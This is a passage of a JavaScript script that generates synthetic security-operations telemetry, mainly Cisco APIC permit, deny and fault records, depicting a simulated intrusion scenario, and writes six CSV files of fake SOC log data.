    { src: 'ws-finance-23', dst: 'app-crm-05',   dport: 443,  bytes: 11264, pkts: 14, proto: 'HTTPS', user: 'tpatel@corp.local', mins: 34, health: 85 },
    { src: 'ws-finance-24', dst: 'fs-payroll-01',dport: 445,  bytes: 7168,  pkts: 10, proto: 'SMB',   user: 'kreyes@corp.local', mins: 36, health: 88 },
    { src: 'eng-ws-44',     dst: EXT.github.ip,  dport: 443,  bytes: 10240, pkts: 14, proto: 'HTTPS', user: 'roshea@corp.local', mins: 38, health: 79 },
    { src: 'ws-finance-22', dst: EXT.o365.ip,    dport: 587,  bytes: 6144,  pkts: 8,  proto: 'SMTP-TLS',user:'mchen@corp.local',mins:42,health:88 },
  ];
  extraFlows.forEach((f, i) => {
    const sh = HOSTS[f.src];
    const dhEntry = Object.entries(HOSTS).find(([n]) => n === f.dst) || [];
    const dh = dhEntry[1] || Object.values(EXT).find(e => e.ip === f.dst) || { ip: f.dst, mac:'00:00:00:00:00:00', country:'US', asn:'64512' };
    const dstName = dhEntry[0] || f.dst;
    push([ts(BASE, f.mins), `Client-Traffic-${f.proto}`, 'ClientAssurance', 'info',
      sh.ip, rand(54000, 65000), dh.ip, f.dport, f.src, dstName,
      `sw-dist-0${(i%2)+1}`, sites[i%2], 'ClientTraffic', f.bytes, f.pkts, f.proto,
      rand(5, 15), f.user, sh.vlan, 'CorpSSID', apNames[i % apNames.length], rand(8, 30),
      '', f.health, rand(75, 95), '5GHz', -rand(50, 70), pick([36, 40, 44, 48]), rand(200, 600), 'EAP-TLS', sh.os
    ]);
  });

  return [headers.join(','), ...rows].join('\n');
}

// ── Cisco APIC / ACI ────────────────────────────────────────────────────────────
function generateAPIC() {
  const headers = [
    'timestamp','event_id','event_name','category',
    'src_ip','src_port','dst_ip','dst_port',
    'src_epg','dst_epg','tenant','vrf','contract','subject',
    'action','protocol','bytes','packets','severity','risk_score',
    'fault_code','alert_name','src_hostname','dst_hostname',
    'bd','ap','src_class','dst_class','policy_name',
    'hit_count','last_hit','vzentry'
  ];

  const rows = [];
  let aId = 1;
  const push = (fields) => { rows.push(row([`APIC-POL-${pad(aId++, 4)}`, ...fields])); };

  // Normal permit flows
  const permitFlows = [
    { src:'ws-finance-21', dst:'fs-payroll-01', sport:49300, dport:445, srcEpg:'Finance-EPG', dstEpg:'Servers-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Finance-to-Servers', subj:'smb-access', proto:'TCP', bytes:8192, pkts:12, sev:'info', risk:5, mins:1, vzentry:'smb-permit' },
    { src:'ws-finance-22', dst:'fs-payroll-01', sport:49301, dport:445, srcEpg:'Finance-EPG', dstEpg:'Servers-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Finance-to-Servers', subj:'smb-access', proto:'TCP', bytes:6144, pkts:10, sev:'info', risk:5, mins:3, vzentry:'smb-permit' },
    { src:'ws-finance-23', dst:'db-finance-03', sport:49302, dport:1433, srcEpg:'Finance-EPG', dstEpg:'DB-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Finance-to-DB', subj:'mssql-access', proto:'TCP', bytes:4096, pkts:6, sev:'info', risk:5, mins:5, vzentry:'mssql-permit' },
    { src:'ws-hr-31',      dst:'fs-hr-02',      sport:49303, dport:445, srcEpg:'HR-EPG', dstEpg:'Servers-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'HR-to-Servers', subj:'smb-access', proto:'TCP', bytes:5120, pkts:7, sev:'info', risk:4, mins:7, vzentry:'smb-permit' },
    { src:'eng-ws-44',     dst:'dc-primary-01', sport:49304, dport:389, srcEpg:'Eng-EPG', dstEpg:'Auth-EPG', tenant:'Dev-Tenant', vrf:'Dev-VRF', contract:'Corp-to-Auth', subj:'ldap-auth', proto:'TCP', bytes:3200, pkts:10, sev:'info', risk:5, mins:9, vzentry:'ldap-permit' },
    { src:'ws-finance-24', dst:'app-erp-04',    sport:54001, dport:8443, srcEpg:'Finance-EPG', dstEpg:'App-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Finance-to-Apps', subj:'https-access', proto:'TCP', bytes:15360, pkts:20, sev:'info', risk:5, mins:11, vzentry:'https-permit' },
    { src:'ws-finance-25', dst:'app-crm-05',    sport:54002, dport:443, srcEpg:'Finance-EPG', dstEpg:'App-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Finance-to-Apps', subj:'https-access', proto:'TCP', bytes:12288, pkts:16, sev:'info', risk:4, mins:13, vzentry:'https-permit' },
    { src:'ws-hr-32',      dst:'app-crm-05',    sport:54003, dport:443, srcEpg:'HR-EPG', dstEpg:'App-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'HR-to-Apps', subj:'https-access', proto:'TCP', bytes:9216, pkts:12, sev:'info', risk:4, mins:15, vzentry:'https-permit' },
    { src:'eng-ws-45',     dst:'app-erp-04',    sport:54004, dport:8443, srcEpg:'Eng-EPG', dstEpg:'App-EPG', tenant:'Dev-Tenant', vrf:'Dev-VRF', contract:'Eng-to-Apps', subj:'https-access', proto:'TCP', bytes:20480, pkts:26, sev:'info', risk:5, mins:17, vzentry:'https-permit' },
    { src:'eng-ws-46',     dst:'app-erp-04',    sport:54005, dport:8443, srcEpg:'Eng-EPG', dstEpg:'App-EPG', tenant:'Dev-Tenant', vrf:'Dev-VRF', contract:'Eng-to-Apps', subj:'https-access', proto:'TCP', bytes:18432, pkts:24, sev:'info', risk:5, mins:19, vzentry:'https-permit' },
    { src:'ws-finance-21', dst:'dc-primary-01', sport:49305, dport:88, srcEpg:'Finance-EPG', dstEpg:'Auth-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Corp-to-Auth', subj:'kerberos-auth', proto:'TCP', bytes:1024, pkts:4, sev:'info', risk:5, mins:21, vzentry:'kerberos-permit' },
    { src:'ops-jump-56',   dst:'dc-primary-01', sport:52200, dport:636, srcEpg:'Ops-EPG', dstEpg:'Auth-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Ops-to-Auth', subj:'ldaps-auth', proto:'TCP', bytes:3072, pkts:8, sev:'info', risk:6, mins:23, vzentry:'ldaps-permit' },
    { src:'ws-finance-22', dst:'db-finance-03', sport:49306, dport:1433, srcEpg:'Finance-EPG', dstEpg:'DB-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Finance-to-DB', subj:'mssql-access', proto:'TCP', bytes:6144, pkts:8, sev:'info', risk:5, mins:25, vzentry:'mssql-permit' },
    { src:'ws-hr-31',      dst:'dc-primary-01', sport:49307, dport:88, srcEpg:'HR-EPG', dstEpg:'Auth-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Corp-to-Auth', subj:'kerberos-auth', proto:'TCP', bytes:1024, pkts:4, sev:'info', risk:4, mins:27, vzentry:'kerberos-permit' },
    { src:'ws-finance-23', dst:'app-crm-05',    sport:54006, dport:443, srcEpg:'Finance-EPG', dstEpg:'App-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Finance-to-Apps', subj:'https-access', proto:'TCP', bytes:11264, pkts:14, sev:'info', risk:4, mins:29, vzentry:'https-permit' },
  ];

  permitFlows.forEach(f => {
    const sh = HOSTS[f.src]; const dh = HOSTS[f.dst];
    push([ts(BASE, f.mins), 'Zoning-Rule-Permit', 'PolicyEnforcement',
      sh.ip, f.sport, dh.ip, f.dport,
      f.srcEpg, f.dstEpg, f.tenant, f.vrf, f.contract, f.subj,
      'permit', f.proto, f.bytes, f.pkts, f.sev, f.risk,
      '', '', f.src, f.dst,
      `${f.srcEpg}-BD`, `${f.tenant}-AP`, rand(10000, 20000), rand(20000, 40000),
      f.contract, rand(1, 50), ts(BASE, f.mins + rand(0, 2)), f.vzentry
    ]);
  });

  // Deny flows (policy violations - attacker trying to reach restricted zones)
  const denyFlows = [
    { src:'ops-jump-55', dst:'db-finance-03', sport:52150, dport:1433, srcEpg:'Ops-EPG', dstEpg:'DB-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'implicit-deny', subj:'deny-all', proto:'TCP', bytes:0, pkts:0, sev:'warning', risk:72, mins:46, fault:'F0467', alertName:'Policy Violation - Ops to DB Denied' },
    { src:'ws-finance-21', dst:'fs-hr-02',   sport:54100, dport:445, srcEpg:'Finance-EPG', dstEpg:'Servers-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'implicit-deny', subj:'deny-all', proto:'TCP', bytes:0, pkts:0, sev:'warning', risk:65, mins:58, fault:'F0467', alertName:'Policy Violation - Cross-Department SMB Denied' },
    { src:'ops-jump-55', dst:'dc-secondary-02', sport:52151, dport:389, srcEpg:'Ops-EPG', dstEpg:'Auth-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'implicit-deny', subj:'deny-all', proto:'TCP', bytes:0, pkts:0, sev:'high', risk:80, mins:78, fault:'F0467', alertName:'Policy Violation - Ops Direct DC LDAP Denied' },
    { src:'ws-finance-21', dst:'dc-secondary-02', sport:54101, dport:389, srcEpg:'Finance-EPG', dstEpg:'Auth-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'implicit-deny', subj:'deny-all', proto:'TCP', bytes:0, pkts:0, sev:'high', risk:78, mins:85, fault:'F0467', alertName:'Policy Violation - Finance Direct DC LDAP Denied' },
    { src:'ws-finance-21', dst:'rtr-core-01', sport:49500, dport:161, srcEpg:'Finance-EPG', dstEpg:'Infra-EPG', tenant:'Infra-Tenant', vrf:'Infra-VRF', contract:'implicit-deny', subj:'deny-all', proto:'UDP', bytes:0, pkts:0, sev:'warning', risk:60, mins:95, fault:'F0468', alertName:'Policy Violation - Workstation SNMP to Core Router' },
    { src:'ws-finance-21', dst:'sw-dist-01',  sport:49501, dport:23,  srcEpg:'Finance-EPG', dstEpg:'Infra-EPG', tenant:'Infra-Tenant', vrf:'Infra-VRF', contract:'implicit-deny', subj:'deny-all', proto:'TCP', bytes:0, pkts:0, sev:'warning', risk:65, mins:97, fault:'F0468', alertName:'Policy Violation - Workstation Telnet to Switch Denied' },
    { src:'ws-finance-21', dst:EXT.c2_server.ip, sport:54102, dport:8080, srcEpg:'Finance-EPG', dstEpg:'External-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'internet-deny', subj:'deny-external', proto:'TCP', bytes:0, pkts:0, sev:'critical', risk:88, mins:128, fault:'F0470', alertName:'Policy Violation - C2 HTTP Outbound Blocked' },
  ];

  denyFlows.forEach(f => {
    const sh = HOSTS[f.src];
    const dhEntry = Object.entries(HOSTS).find(([n]) => n === f.dst) || [];
    const dh = dhEntry[1] || Object.values(EXT).find(e => e.ip === f.dst) || { ip: f.dst, mac:'00:00:00:00:00:00' };
    const dstName = dhEntry[0] || f.dst;
    push([ts(BASE, f.mins), 'Zoning-Rule-Deny', 'PolicyEnforcement',
      sh.ip, f.sport, dh.ip, f.dport,
      f.srcEpg, f.dstEpg, f.tenant, f.vrf, f.contract, f.subj,
      'deny', f.proto, f.bytes, f.pkts, f.sev, f.risk,
      f.fault, f.alertName, f.src, dstName,
      `${f.srcEpg}-BD`, `${f.tenant}-AP`, rand(10000, 20000), rand(20000, 40000),
      f.contract, rand(1, 15), ts(BASE, f.mins), 'implicit-deny'
    ]);
  });

  // Fabric faults
  const faults = [
    { src:'sw-dist-01', mins:22, code:'F0467', name:'Interface-Down-Fault', sev:'major', risk:55, desc:'Interface Eth1/12 on sw-dist-01 went down' },
    { src:'sw-dist-02', mins:38, code:'F1244', name:'BD-Subnet-Overlap', sev:'minor', risk:35, desc:'Bridge domain subnet overlap detected in Finance-BD' },
    { src:'rtr-core-01', mins:52, code:'F0548', name:'Spine-Leaf-Link-Degraded', sev:'major', risk:60, desc:'Spine-to-leaf link degraded: rtr-core-01 port eth1/1' },
    { src:'fw-edge-01',  mins:75, code:'F0710', name:'Contract-Miss-Rate-High', sev:'major', risk:70, desc:'High zoning rule miss rate on fw-edge-01 - possible scanning' },
    { src:'dc-primary-01',mins:82,code:'F0915', name:'EP-Bounce-Detected', sev:'minor', risk:48, desc:'Endpoint binding bounce detected for 10.10.10.21 (ws-finance-21)' },
    { src:'ise-nad-01',  mins:100, code:'F1100', name:'Radius-Auth-Failure-Spike', sev:'critical', risk:82, desc:'RADIUS auth failure rate spike on ise-nad-01 (>50/min)' },
  ];

  faults.forEach(f => {
    const sh = HOSTS[f.src] || {};
    push([ts(BASE, f.mins), `${f.name}`, 'FabricFault',
      sh.ip || f.src, 0, '', 0,
      'Infra-EPG', 'Infra-EPG', 'Infra-Tenant', 'Infra-VRF', '', '',
      '', 'N/A', 0, 0, f.sev, f.risk,
      f.code, f.desc, f.src, '',
      'Infra-BD', 'Infra-AP', rand(10000, 20000), rand(20000, 40000),
      '', 0, ts(BASE, f.mins), ''
    ]);
  });

  // Additional permit flows for bulk / exfil window
  const lateFlows = [
    { src:'ws-finance-21', dst:'app-erp-04',   sport:54200, dport:8443, srcEpg:'Finance-EPG', dstEpg:'App-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Finance-to-Apps', subj:'https-access', proto:'TCP', bytes:524288, pkts:640, sev:'info', risk:8, mins:99, vzentry:'https-permit' },
    { src:'ws-finance-24', dst:'fs-payroll-01',sport:49400, dport:445, srcEpg:'Finance-EPG', dstEpg:'Servers-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Finance-to-Servers', subj:'smb-access', proto:'TCP', bytes:7168, pkts:10, sev:'info', risk:5, mins:103, vzentry:'smb-permit' },
    { src:'ws-finance-25', dst:'db-finance-03',sport:49401, dport:1433, srcEpg:'Finance-EPG', dstEpg:'DB-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Finance-to-DB', subj:'mssql-access', proto:'TCP', bytes:8192, pkts:12, sev:'info', risk:5, mins:107, vzentry:'mssql-permit' },
    { src:'eng-ws-44',     dst:EXT.github.ip,  sport:54201, dport:443, srcEpg:'Eng-EPG', dstEpg:'External-EPG', tenant:'Dev-Tenant', vrf:'Dev-VRF', contract:'Eng-to-Internet', subj:'https-access', proto:'TCP', bytes:10240, pkts:14, sev:'info', risk:6, mins:110, vzentry:'https-permit' },
    { src:'ws-hr-32',      dst:'app-crm-05',   sport:54202, dport:443, srcEpg:'HR-EPG', dstEpg:'App-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'HR-to-Apps', subj:'https-access', proto:'TCP', bytes:9216, pkts:12, sev:'info', risk:4, mins:113, vzentry:'https-permit' },
    { src:'ws-finance-23', dst:'fs-hr-02',     sport:49402, dport:445, srcEpg:'Finance-EPG', dstEpg:'Servers-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Finance-to-Servers', subj:'smb-access', proto:'TCP', bytes:5632, pkts:8, sev:'info', risk:5, mins:115, vzentry:'smb-permit' },
    { src:'ops-jump-56',   dst:'app-erp-04',   sport:52300, dport:8443, srcEpg:'Ops-EPG', dstEpg:'App-EPG', tenant:'Prod-Tenant', vrf:'Prod-VRF', contract:'Ops-to-Apps', subj:'https-access', proto:'TCP', bytes:4096, pkts:6, sev:'info', risk:6, mins:117, vzentry:'https-permit' },
    { src:'lab-host-62',   dst:'app-crm-05',   sport:54203, dport:443, srcEpg:'Lab-EPG', dstEpg:'App-EPG', tenant:'Dev-Tenant', vrf:'Dev-VRF', contract:'Lab-to-Apps', subj:'https-access', proto:'TCP', bytes:6144, pkts:8, sev:'info', risk:6, mins:119, vzentry:'https-permit' },
  ];

  lateFlows.forEach(f => {
    const sh = HOSTS[f.src];
    const dhEntry = Object.entries(HOSTS).find(([n]) => n === f.dst) || [];
    const dh = dhEntry[1] || Object.values(EXT).find(e => e.ip === f.dst) || { ip: f.dst };
    const dstName = dhEntry[0] || f.dst;
    push([ts(BASE, f.mins), 'Zoning-Rule-Permit', 'PolicyEnforcement',
      sh.ip, f.sport, dh.ip, f.dport,
      f.srcEpg, f.dstEpg, f.tenant, f.vrf, f.contract, f.subj,
      'permit', f.proto, f.bytes, f.pkts, f.sev, f.risk,
      '', '', f.src, dstName,
      `${f.srcEpg}-BD`, `${f.tenant}-AP`, rand(10000, 20000), rand(20000, 40000),
      f.contract, rand(1, 50), ts(BASE, f.mins + rand(0, 2)), f.vzentry
    ]);
  });

  return [headers.join(','), ...rows].join('\n');
}

// ── Write files ──────────────────────────────────────────────────────────────────
const files = {
  'qradar_events.csv':     generateQRadar(),
  'sna_flows.csv':         generateSNA(),
  'arista_ndr.csv':        generateArista(),
  'cisco_ise_events.csv':  generateISE(),
  'cisco_dnac_events.csv': generateDNAC(),
  'cisco_apic_events.csv': generateAPIC(),
};

for (const [name, content] of Object.entries(files)) {
  const outPath = join(DATA_DIR, name);
  writeFileSync(outPath, content, 'utf8');
  const lines = content.split('\n').length - 1; // -1 for header
  console.log(`✓ ${name}: ${lines} data rows`);
}

console.log('\nDone. All 6 CSV files regenerated with realistic SOC telemetry.');
